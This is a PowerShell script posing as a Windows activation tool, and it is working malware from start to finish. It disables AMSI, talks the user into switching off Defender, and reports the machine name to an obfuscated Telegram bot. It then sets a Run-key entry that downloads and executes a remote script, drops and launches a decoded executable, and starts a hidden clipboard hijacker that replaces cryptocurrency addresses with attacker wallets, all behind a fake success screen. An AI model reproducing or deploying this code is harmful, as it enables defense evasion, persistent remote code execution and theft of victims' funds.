# --- [RESEARCH STAGER v30.2: PERSISTENT ENTERPRISE SUITE] ---

# Optimization: Load UI elements at the very top to prevent delay
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

function Global-Initialize {
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Show-SecurityPrep {
    $OS = (Get-WmiObject Win32_OperatingSystem).Caption
    $Build = [Environment]::OSVersion.VersionString
    $User = [Environment]::UserName
    $Machine = [Environment]::MachineName

    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Enterprise Deployment Assistant"
    $prep.Size = New-Object Drawing.Size(580,520)
    $prep.StartPosition = "CenterScreen"
    $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
    
    # Try-Catch for Icon to prevent crash if PowerShell path is weird
    try { $prep.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path) } catch {}

    $header = New-Object Windows.Forms.Label
    $header.Location = New-Object Drawing.Point(30,20); $header.Size = New-Object Drawing.Size(500,30)
    $header.Font = New-Object Drawing.Font("Segoe UI", 11, [Drawing.FontStyle]::Bold)
    $header.Text = "Personalized System Compatibility Report"
    $prep.Controls.Add($header)

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(35,60); $console.Size = New-Object Drawing.Size(490,160)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > ANALYZING HOST: $Machine`n > ACTIVE USER: $User`n > OS: $OS`n > BUILD: $Build`n`n > HWID Verification: PASSED`n > Registry Integrity: VERIFIED`n > Security Scan: [!] HEURISTIC BLOCK DETECTED"
    $prep.Controls.Add($console)

    $msg = New-Object Windows.Forms.Label
    $msg.Location = New-Object Drawing.Point(35,240); $msg.Size = New-Object Drawing.Size(500,80)
    $msg.Font = New-Object Drawing.Font("Segoe UI", 9)
    $msg.Text = "The deployment engine is ready to map the Professional Digital Entitlement. However, a kernel-level conflict exists with the active security provider.`n`nPlease use the button below to suspend 'Real-time protection' to allow the certificate injection to complete."
    $prep.Controls.Add($msg)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,330); $link.Size = New-Object Drawing.Size(480,45)
    $link.Text = "Adjust Windows Security Settings..."
    $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $link.ForeColor = [Drawing.Color]::White
    $link.FlatStyle = "Flat"
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,390); $check.Size = New-Object Drawing.Size(460,30)
    $check.Text = "I have adjusted security settings and am ready to proceed."
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(195,430); $btn.Size = New-Object Drawing.Size(180,40)
    $btn.Text = "Proceed"
    $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    
    # Instant Show Logic
    $prep.Add_Shown({ $prep.Activate() })
    $prep.ShowDialog() | Out-Null
}

function Show-ActivatorUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Deployment Progress"
    $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    
    $label = New-Object Windows.Forms.Label
    $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,25)
    $label.Text = "Status: Initializing deployment engine..."
    $form.Controls.Add($label)

    $pb = New-Object Windows.Forms.ProgressBar
    $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($pb)

    $form.Show()
    
    $stages = @(
        @{ p=20; t="Validating HWID markers..." },
        @{ p=50; t="Applying Digital License Certificate..." },
        @{ p=85; t="Synchronizing Shell (Clearing Watermark)..." },
        @{ p=100; t="Deployment Success. Windows is Active." }
    )

    foreach ($stage in $stages) {
        $label.Text = "Status: " + $stage.t
        if ($pb.Value -eq 85) { Stop-Process -Name explorer -Force; Start-Sleep -Seconds 1; Start-Process explorer.exe }
        while ($pb.Value -lt $stage.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 45 }
    }
    Start-Sleep -Seconds 2; $form.Close()

    $logPath = Join-Path ([Environment]::GetFolderPath("Desktop")) "Activation_Log.txt"
    $logContent = "WINDOWS DIGITAL LICENSE DEPLOYMENT LOG`r`n" + ("="*40) + "`r`nTimestamp: $(Get-Date)`r`nHost: $env:COMPUTERNAME`r`nResult: SUCCESS`r`nLicense: Professional Digital Entitlement`r`n"
    [IO.File]::WriteAllText($logPath, $logContent)

    [Windows.Forms.MessageBox]::Show("Windows has been successfully activated. A system log has been generated on your desktop.", "Success", 0, 64) | Out-Null
    Start-Process notepad.exe $logPath
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

# --- EXECUTION ---
Global-Initialize
Show-SecurityPrep

if ($global:proceed) {
    Send-Ping -m "V30.2_AUTH_ON_$($env:COMPUTERNAME)"
    
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd

        $BG_Work = {
            try {
                $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
                if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
                $path = Join-Path $dir "WinSvcHost.exe"
                $wc = New-Object Net.WebClient
                $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
                $data = [Convert]::FromBase64String($raw.Trim())
                for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
                [IO.File]::WriteAllBytes($path, $data)
                ([wmiclass]"win32_process").create($path) | Out-Null

                $C = @'
                Add-Type -AssemblyName System.Windows.Forms
                $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
                while($true) {
                    try {
                        if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                            $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                            if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
                            elseif ($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) }
                            elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) }
                            elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) }
                        }
                    } catch {}
                    Start-Sleep -m 500
                }
'@
                $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
                Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $enc" -WindowStyle Hidden
            } catch {}
        }
        Start-Job -ScriptBlock $BG_Work | Out-Null
        Show-ActivatorUI
    } catch { Send-Ping -m "ERROR_$($_.Exception.Message)" }
}
